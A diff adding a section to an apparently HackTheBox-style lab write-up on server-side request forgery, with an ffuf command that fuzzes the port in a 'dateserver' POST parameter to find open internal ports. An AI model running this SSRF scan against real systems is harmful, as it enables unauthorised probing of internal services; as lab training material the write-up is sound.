@@ -203,3 +203,10 @@ We can try and using this technique to try and identify files on the server ->
 
 <figure><img src="../../../.gitbook/assets/image (1342).png" alt=""><figcaption><p>Wrong file</p></figcaption></figure>
 
+_**Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?**_
+
+```
+ffuf -w num.txt -u http://10.129.75.48/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb:FUZZ&date=2024-01-01" -fr "Something" -v
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
